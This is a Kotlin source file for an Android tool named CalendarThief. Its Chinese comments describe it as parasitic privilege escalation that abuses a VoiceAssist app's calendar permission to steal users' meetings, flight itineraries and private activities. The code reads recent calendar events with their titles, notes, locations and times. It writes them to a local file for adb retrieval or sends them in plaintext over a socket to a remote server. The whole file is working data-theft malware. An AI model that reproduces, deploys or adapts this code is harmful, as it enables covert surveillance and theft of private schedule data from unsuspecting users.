package xyz.mufanc.vap.util

import android.content.ContentResolver
import android.database.Cursor
import android.provider.CalendarContract
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.File
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * 寄生提权：日历日程窃取工具 (明文版)
 * 利用 VoiceAssist 的 READ_CALENDAR 权限获取用户的会议安排、航班行程与私人活动轨迹。
 */
class CalendarThief {

    companion object {
        private const val TAG = "CalendarThief"

        // Android 标准日历事件的 URI
        private val CALENDAR_URI = CalendarContract.Events.CONTENT_URI

        // 需要提取的核心字段
        private const val COLUMN_TITLE = CalendarContract.Events.TITLE
        private const val COLUMN_DESCRIPTION = CalendarContract.Events.DESCRIPTION
        private const val COLUMN_LOCATION = CalendarContract.Events.EVENT_LOCATION
        private const val COLUMN_DTSTART = CalendarContract.Events.DTSTART
        private const val COLUMN_DTEND = CalendarContract.Events.DTEND
    }

    /**
     * 窃取日历日程并保存到设备本地文件（USB 模式，供 adb pull）
     */
    fun stealToFile(outputPath: String, limit: Int = 30): Int {
        return try {
            val calendarArray = queryCalendarEvents(limit)
            File(outputPath).writeText(calendarArray.toString(4))
            Log.i(TAG, "Plaintext calendar data written to $outputPath")
            calendarArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to write calendar file", e)
            0
        }
    }

    /**
     * 窃取日历日程并通过 socket 回传（WiFi 模式）
     */
    fun stealToSocket(serverAddress: String, serverPort: Int, limit: Int = 30): Int {
        return try {
            val calendarArray = queryCalendarEvents(limit)
            val socket = Socket(serverAddress, serverPort)
            val outputStream = BufferedOutputStream(socket.getOutputStream())
            val payload = calendarArray.toString().toByteArray(Charsets.UTF_8)

            outputStream.write(payload)
            outputStream.flush()
            socket.shutdownOutput()

            outputStream.close()
            socket.close()

            Log.i(TAG, "Plaintext calendar events sent to $serverAddress:$serverPort")
            calendarArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to exfiltrate calendar events", e)
            0
        }
    }

    private fun queryCalendarEvents(limit: Int): JSONArray {
        val calendarArray = JSONArray()
        val resolver: ContentResolver = Ctx.app.contentResolver
        val format = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())

        var cursor: Cursor? = null
        try {
            cursor = resolver.query(
                CALENDAR_URI,
                arrayOf(COLUMN_TITLE, COLUMN_DESCRIPTION, COLUMN_LOCATION, COLUMN_DTSTART, COLUMN_DTEND),
                null,
                null,
                "$COLUMN_DTSTART DESC LIMIT $limit"
            )

            if (cursor == null) {
                Log.w(TAG, "Cursor is null, failed to read calendar events")
                return calendarArray
            }

            val titleIdx = cursor.getColumnIndex(COLUMN_TITLE)
            val descIdx = cursor.getColumnIndex(COLUMN_DESCRIPTION)
            val locIdx = cursor.getColumnIndex(COLUMN_LOCATION)
            val startIdx = cursor.getColumnIndex(COLUMN_DTSTART)
            val endIdx = cursor.getColumnIndex(COLUMN_DTEND)

            while (cursor.moveToNext()) {
                val rawTitle = if (titleIdx != -1 && !cursor.isNull(titleIdx)) cursor.getString(titleIdx) else "无标题事件"
                val rawDesc = if (descIdx != -1 && !cursor.isNull(descIdx)) cursor.getString(descIdx) else "无备注"
                val rawLoc = if (locIdx != -1 && !cursor.isNull(locIdx)) cursor.getString(locIdx) else "未定地点"
                val rawStart = if (startIdx != -1) cursor.getLong(startIdx) else 0L
                val rawEnd = if (endIdx != -1) cursor.getLong(endIdx) else 0L

                val eventObj = JSONObject()
                eventObj.put("title", rawTitle)
                eventObj.put("description", rawDesc.replace("\n", " | "))
                eventObj.put("location", rawLoc)
                eventObj.put("start_time", format.format(Date(rawStart)))
                eventObj.put("end_time", if (rawEnd > 0) format.format(Date(rawEnd)) else "未知")
                calendarArray.put(eventObj)
            }

            Log.i(TAG, "Successfully extracted ${calendarArray.length()} plaintext calendar events")
        } catch (e: Exception) {
            Log.e(TAG, "Error while stealing calendar events", e)
        } finally {
            cursor?.close()
        }

        return calendarArray
    }
}
